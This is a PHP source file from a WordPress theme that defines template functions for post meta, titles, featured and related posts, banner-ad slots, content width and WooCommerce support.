if ( ! function_exists( 'themebeagle_entry_meta_bottom' ) ) :
function themebeagle_entry_meta_bottom() {

	$postmeta = tb_option('bottom_postmeta');

	echo '<div class="entry-meta">';

		// Post author
		if ( in_array('authorname', $postmeta) && 'page' != get_post_type() ) {
			printf('<span class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person">' . __('', 'themebeagle') . '<a class="entry-author-link" href="%1$s" title="%2$s" itemprop="url" rel="author">%3$s</a></span>',
				esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
				esc_attr( sprintf( __( 'View all posts by %s', 'themebeagle' ), get_the_author() ) ),
				get_the_author()
			);
		}

		// Post Date
		if ( in_array('date', $postmeta) ) {
			echo '<span class="date">';
			themebeagle_entry_date();
			echo '</span>';
		}

		// Post Categories.
		if ( in_array('cats', $postmeta) ) {
			$categories_list = get_the_category_list( __( ', ', 'themebeagle' ) );
			if ( $categories_list ) {
				echo '<span class="categories-links">' . $categories_list . '</span>';
			}
		}

		//  Post Tags.
		if ( in_array('tags', $postmeta) && 'page' != get_post_type() ) {
			$tag_list = get_the_tag_list( '', __( ', ', 'themebeagle' ) );
			if ( $tag_list ) {
				echo '<span class="tags-links">' . $tag_list . '</span>';
			}
		}

		// Comments Link
		if ( comments_open() && in_array('comments', $postmeta) && 'page' != get_post_type() ) {
			echo '<span class="comments-link">';
			comments_popup_link( __('Comments', 'themebeagle'), __('1 Comment', 'themebeagle'), __('% Comments', 'themebeagle') );
			echo '</span>';
		}

		// Edit Post Link
		if ( in_array('edit', $postmeta) ) {
			edit_post_link( __( 'Edit', 'themebeagle' ), '<span class="edit-link">', '</span>' );
		}

		// Read More Link
		if ( !is_single() && in_array('read-more', $postmeta) ) {
			printf('<a class="entry-more-link" href="%1$s" title="%2$s" itemprop="url">%3$s</a>',
				esc_url( get_permalink() ),
				esc_attr( __('Read the Rest of this Post', 'themebeagle') ),
				__('Read More &raquo;', 'themebeagle')
			);
		}

	echo '</div><!-- .entry-meta -->';

}
endif;



/*-----------------------------------------------------------------------------------*/
// ENTRY TITLE
// Print entry Title.
// Create your own themebeagle_entry_title() to override in a child theme.
// @since 1.0
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'themebeagle_entry_title' ) ) :
function themebeagle_entry_title() {
	global $post;
	$format = get_post_format();
	if ( false === $format ) {
		$format = 'standard';
	}
	$format_link = get_post_format_link($format);
	$formaticon = '';
	if ( tb_option('formaticons') )
		$formaticon = '<a class="formaticon" href="' . $format_link . '" title="' . __("Post Format: ", "themebeagle") . $format . '"><span class="screen-reader-text">'.$format.'</span></a>';

	if ( is_single() ) { ?>
		<h1 class="entry-title" itemprop="headline">
			<span>
				<?php echo $formaticon; ?>
				<?php the_title(); ?>
			</span>
		</h1>
	<?php } else { ?>
		<h2 class="entry-title" itemprop="headline">
			<span>
				<?php echo $formaticon; ?>
				<a href="<?php echo esc_url( get_permalink()); ?>" rel="bookmark"><?php the_title(); ?></a>
			</span>
		</h2>
	<?php }
}
endif;



/*-----------------------------------------------------------------------------------*/
// FEATURED POST IDs
// Function to collect the Post IDs for Posts and Pages tagged as featured.
// @since 1.0
/*-----------------------------------------------------------------------------------*/

function tb_featuredposts() {
	$featurecount = tb_option('featurecount');
	$featuretags = array( 'featured', 'featured-2', 'featured-3' );
	$featuredposts = get_posts( array(
		'post_type' => array('post', 'page'),
		'tax_query' => array(
			array(
				'taxonomy' => 'post_tag',
				'field' => 'slug',
				'terms' => $featuretags
			)
		),
		'posts_per_page' => $featurecount
	));

	$posts = array();

	foreach ($featuredposts as $post) {
		$posts[] += $post->ID;
	}

	if ($posts) {
		return $posts;
	}

}



/*-----------------------------------------------------------------------------------*/
// EXCLUDE POSTS
// Functions to exclude home page posts and categories based on theme settings.
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_action('pre_get_posts', 'tb_exclude_posts_cats');
function tb_exclude_posts_cats( $query ) {
	if( $query->is_main_query() && $query->is_home() && tb_option('hide_dupes') && tb_option('home_featured_posts') != 'none' ) {
		$do_not_duplicate = tb_featuredposts();
		$query->set( 'post__not_in', $do_not_duplicate);
	}
	if( $query->is_main_query() && ($query->is_home() || $query->is_archive()) && tb_option('exclude_cats') ) {
		$cats = tb_option('exclude_cats');
		$query->set( 'category__not_in', $cats);
	}
}

add_filter( 'widget_categories_args', 'widget_categories_args_filter', 10, 1 );
function widget_categories_args_filter( $cat_args ) {
	$exclude_arr = tb_option('exclude_cats');
	if( isset( $cat_args['exclude'] ) && !empty( $cat_args['exclude'] ) )
		$exclude_arr = array_unique( array_merge( explode( ',', $cat_args['exclude'] ), $exclude_arr ) );
	$cat_args['exclude'] = implode( ',', $exclude_arr );
	return $cat_args;
}



/*-----------------------------------------------------------------------------------*/
// GOOGLE PLUS META TAG
// Function that adds google plus link to page head.
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_action('wp_enqueue_scripts', 'tb_googplus');
function tb_googplus() {
	if ( tb_option('google_url')) { ?>
		<!-- Google Plus Link -->
		<link rel="author" href="<?php echo stripslashes(tb_option('google_url')); ?>" />
	<?php } 
}



/*-----------------------------------------------------------------------------------*/
// HEADER BANNER AD
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_action('themebeagle_after_branding', 'tb_ad_header');
function tb_ad_header() {

	$adcode = '';

	if ( is_singular() ) {
		global $post;
		$adcode = get_post_meta($post->ID, 'tb_ad_header_code', true);
		if ( ! $adcode && tb_option('ad_header') ) {
			$adcode = tb_option('ad_header_code');
		}
	}

	if ( !is_singular() && tb_option('ad_header') ) {
		$adcode = tb_option('ad_header_code');
	}

	if ( $adcode ) { ?>
		<!-- HEADER BANNER -->
		<div class="banner-ad ad-header" style="background-color:<?php echo tb_option('ad_header_bg'); ?>">
			<?php echo do_shortcode(stripslashes($adcode)); ?>
		</div>
	<?php }
}



/*-----------------------------------------------------------------------------------*/
// CONTENT TOP BANNER AD
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_action('themebeagle_site_content', 'tb_ad_content_top');
function tb_ad_content_top() {

	$adcode = '';

	if ( is_singular() ) {
		global $post;
		$adcode = get_post_meta($post->ID, 'tb_ad_content_top_code', true);
		if ( ! $adcode && tb_option('ad_content_top') ) {
			$adcode = tb_option('ad_content_top_code');
		}
	}

	if ( !is_singular() && tb_option('ad_content_top') ) {
		$adcode = tb_option('ad_content_top_code');
	}

	if ( $adcode ) { ?>
		<!-- TOP CONTENT BANNER -->
		<div class="banner-ad ad-content-top" style="background-color:<?php echo tb_option('ad_content_top_bg'); ?>">
			<?php echo do_shortcode(stripslashes($adcode)); ?>
		</div>
	<?php }
}



/*-----------------------------------------------------------------------------------*/
// CONTENT BOTTOM BANNER AD
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_action('themebeagle_site_content_bottom', 'tb_ad_content_bottom');
function tb_ad_content_bottom() {

	$adcode = '';

	if ( is_singular() ) {
		global $post;
		$adcode = get_post_meta($post->ID, 'tb_ad_content_bottom_code', true);
		if ( ! $adcode && tb_option('ad_content_bottom') ) {
			$adcode = tb_option('ad_content_bottom_code');
		}
	}

	if ( !is_singular() && tb_option('ad_content_bottom') ) {
		$adcode = tb_option('ad_content_bottom_code');
	}

	if ( $adcode ) { ?>
		<!-- BOTTOM CONTENT BANNER -->
		<div class="banner-ad ad-content-bottom" style="background-color:<?php echo tb_option('ad_content_bottom_bg'); ?>">
			<?php echo do_shortcode(stripslashes($adcode)); ?>
		</div>
	<?php }
}



/*-----------------------------------------------------------------------------------*/
// BELOW HEADER BANNER AD
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_action('themebeagle_before_site_inner', 'tb_ad_below_header', 9);
function tb_ad_below_header() {

	$adcode = '';

	if ( is_singular() ) {
		global $post;
		$adcode = get_post_meta($post->ID, 'tb_ad_below_header_code', true);
		if ( ! $adcode && tb_option('ad_below_header') ) {
			$adcode = tb_option('ad_below_header_code');
		}
	}

	if ( !is_singular() && tb_option('ad_below_header') ) {
		$adcode = tb_option('ad_below_header_code');
	}

	if ( $adcode ) { ?>
		<!-- BELOW HEADER BANNER -->
		<div class="banner-ad ad-below-header" style="background-color:<?php echo tb_option('ad_below_header_bg'); ?>">
			<div class="wrap">
				<?php echo do_shortcode(stripslashes($adcode)); ?>
			</div>
		</div>
	<?php }
}



/*-----------------------------------------------------------------------------------*/
// ABOVE FOOTER BANNER AD
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_action('themebeagle_above_footer', 'tb_ad_above_footer');
function tb_ad_above_footer() {

	$adcode = '';

	if ( is_singular() ) {
		global $post;
		$adcode = get_post_meta($post->ID, 'tb_ad_above_footer_code', true);
		if ( ! $adcode && tb_option('ad_above_footer') ) {
			$adcode = tb_option('ad_above_footer_code');
		}
	}

	if ( !is_singular() && tb_option('ad_above_footer') ) {
		$adcode = tb_option('ad_above_footer_code');
	}

	if ( $adcode ) { ?>
		<!-- ABOVE FOOTER BANNER -->
		<div class="banner-ad ad-above-footer" style="background-color:<?php echo tb_option('ad_above_footer_bg'); ?>">
			<div class="wrap">
				<?php echo do_shortcode(stripslashes($adcode)); ?>
			</div>
		</div>
	<?php }
}



/*-----------------------------------------------------------------------------------*/
// BELOW POST BANNER AD
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_action('themebeagle_before_comments', 'tb_ad_below_post_footer');
function tb_ad_below_post_footer() {

	$adcode = '';

	if ( is_singular() ) {
		global $post;
		$adcode = get_post_meta($post->ID, 'tb_ad_below_post_code', true);
		if ( ! $adcode && tb_option('ad_below_post') ) {
			$adcode = tb_option('ad_below_post_code');
		}
	}

	if ( !is_singular() && tb_option('ad_below_post') ) {
		$adcode = tb_option('ad_below_post_code');
	}

	if ( $adcode ) { ?>
		<!-- BELOW POST FOOTER BANNER -->
		<div class="banner-ad ad-below-post" style="background-color:<?php echo tb_option('ad_below_post_bg'); ?>">
			<?php echo do_shortcode(stripslashes($adcode)); ?>
		</div>
	<?php }
}



/*-----------------------------------------------------------------------------------*/
// POST EXCERPT
// @since 1.0
/*-----------------------------------------------------------------------------------*/

function themebeagle_excerpt() {

	if ( is_search() ) {
		the_excerpt();
	} elseif ( has_post_format('quote') || is_single() || tb_option('post_excerpt') == 'content' ) {
		the_content( __( '', 'themebeagle' ) );
	} else {
		the_excerpt(); ?>
	<?php }

	if ( is_single() ) {
		wp_link_pages(array(
			'before' => '<p class="link-pages">',
			'after' => '</p>',
			'link_before' => '<span>',
			'link_after' => '</span>',
			'separator' => ''
		));
	}

}



/*-----------------------------------------------------------------------------------*/
// RELATED POSTS
// @since 1.0
/*-----------------------------------------------------------------------------------*/

function themebeagle_related_posts() {

	global $post;
	$hidestuff = array();
	if ( get_post_meta($post->ID, 'tb_hide_stuff', true) ) { $hidestuff = get_post_meta($post->ID, 'tb_hide_stuff', true); }
	if ( !tb_option('single_related') || in_array('hide_related', $hidestuff) )
		return;

	$postid = array($post->ID);
	$cats = get_the_category();
	$numposts = '3';
	$numposts = tb_option('related_count');
	$related = new WP_Query(array(
		'category__in' => wp_get_post_categories($post->ID),
		'posts_per_page' => $numposts,
		'orderby' => 'rand',
		'post__not_in' => $postid
	));

	
	if ( $numposts == '4' ) { $numclass = ' four';
	} elseif ( $numposts == '5' ) { $numclass = ' five';
	} elseif ( $numposts == '6' ) { $numclass = ' six';
	} else { $numclass = ''; }

	if ( $related->have_posts() ) :
		echo '<div class="tb-related-posts' . $numclass . '">';
		echo '<h3 class="related-title">' . tb_option('related_title') . '</h3>';
		echo '<div class="related-wrap">';
		while ($related->have_posts()) : $related->the_post();
			themebeagle_related_thumbnail();
		endwhile;
		echo '</div>';
		echo '</div>';
	endif;
	wp_reset_query();
}



/*-----------------------------------------------------------------------------------*/
// SET CONTENT WIDTH BASED ON THEME'S DESIGN
// See themebeagle_content_width() for adjustments based on page layout.
// @since 1.0
/*-----------------------------------------------------------------------------------*/

if ( ! isset( $content_width ) )
	$content_width = 1280;



/*-----------------------------------------------------------------------------------*/
// Adjust $content_width based on theme settings and page layout.
// @since 1.0
/*-----------------------------------------------------------------------------------*/

add_action( 'template_redirect', 'themebeagle_content_width' );
function themebeagle_content_width() {

	global $content_width;
	$layout = '';
	$layout = tb_option('default_layout');

	if ( is_home() || is_front_page()  ) {
		$layout = tb_option('home_layout');
		if ( ! $layout || $layout == "default" ) {
			$layout = tb_option('default_layout');
		}
	}

	if ( is_single() ) {
		global $post;
		$layout = get_post_meta($post->ID, 'tb_page_layout', true);
		if ( ! $layout || $layout == "default" )
			$layout = tb_option('single_layout');

		if ( ! $layout || $layout == "default" ) 
			$layout = tb_option('default_layout');
	}

	if ( is_page() ) {
		global $post;
		$layout = get_post_meta($post->ID, 'tb_page_layout', true);
		if ( ! $layout || $layout == "default" )
			$layout = tb_option('page_layout');
		if ( ! $layout || $layout == "default" ) 
			$layout = tb_option('default_layout');
	}

	if ( is_archive() ) {
		$layout = tb_option('archive_layout');
		if ( ! $layout || $layout == "default" ) {
			$layout = tb_option('default_layout');
		}
	}

	if ( function_exists('is_bbpress') && is_bbpress() ) {
		$layout = tb_option('bbpress_layout');
		if ( ! $layout || $layout == "default" ) {
			$layout = tb_option('default_layout');
		}
	}

	if ( is_404() ) {
		$layout = tb_option('404_layout');
		if ( ! $layout || $layout == "default" ) {
			$layout = tb_option('default_layout');
		}
	}

	if ( $layout == 'c-sw' || $layout == 'sw-c' )
		$content_width = 740;
	elseif ( $layout == 'fw' )
		$content_width = 520;

}



/*-----------------------------------------------------------------------------------*/
// WOOCOMMERCE SUPPORT
// @since 1.1
/*-----------------------------------------------------------------------------------*/

add_theme_support( 'woocommerce' );

if ( ! function_exists( 'is_woocommerce_activated' ) ) {
	function is_woocommerce_activated() {
		if ( class_exists( 'woocommerce' ) ) { return true; } else { return false; }
	}
}

remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10);
remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10);

add_action('woocommerce_before_main_content', 'tb_theme_wrapper_start', 10);
add_action('woocommerce_after_main_content', 'tb_theme_wrapper_end', 10);

function tb_theme_wrapper_start() {
	get_header();
}

function tb_theme_wrapper_end() {
	get_footer();
}